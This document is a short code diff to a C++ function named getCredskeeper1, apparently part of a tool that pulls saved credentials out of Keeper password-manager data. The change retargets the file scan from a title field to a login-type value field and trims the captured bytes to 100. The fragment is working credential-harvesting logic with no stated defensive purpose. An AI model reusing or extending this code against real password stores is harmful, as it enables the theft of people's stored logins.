@@ -12,7 +12,7 @@ int getCredskeeper1(std::string filename) {
         return 1;
     }
 
-    std::string searchSequence = "{\"title\":";
+    std::string searchSequence = "{\"type\":\"login\",\"value\":";
     std::vector<char> foundData;
 
     while (!file.eof()) {
@@ -22,9 +22,9 @@ int getCredskeeper1(std::string filename) {
         if (c == searchSequence[foundData.size()]) {
             foundData.push_back(c);
             if (foundData.size() == searchSequence.size()) {
-                // We found the search sequence, now collect the next 1000 binary characters
+                // We found the search sequence, now collect the next 100 binary characters
                 std::vector<char> extractedData;
-                for (int i = 0; i < 1000; i++) {
+                for (int i = 0; i < 100; i++) {
                     file.get(c);
                     if (file.eof()) {
                         break;
